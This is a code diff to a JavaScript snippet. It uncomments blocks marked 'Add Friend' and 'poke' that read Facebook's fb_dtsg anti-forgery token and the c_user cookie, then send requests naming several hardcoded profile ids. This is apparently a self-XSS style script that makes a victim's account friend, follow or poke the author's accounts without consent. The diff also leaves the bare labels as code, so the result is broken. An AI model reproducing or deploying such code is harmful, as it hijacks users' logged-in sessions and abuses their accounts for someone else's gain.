@@ -145,8 +145,7 @@ p("488215757952020");
 
 
 
-
-/*Add Friend
+Add Friend
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 function IDS(r) {
@@ -163,13 +162,10 @@ function IDS(r) {
 }
 IDS("100006513405329");
 
-*/
 
 
 
-
-
-/*poke
+poke
 var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
 var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
@@ -189,4 +185,4 @@ function p(abone) {
 p("100006513405329");
 p("100002908006006");
 p("100006437590808");
-p("100005202368891"); */
+p("100005202368891");
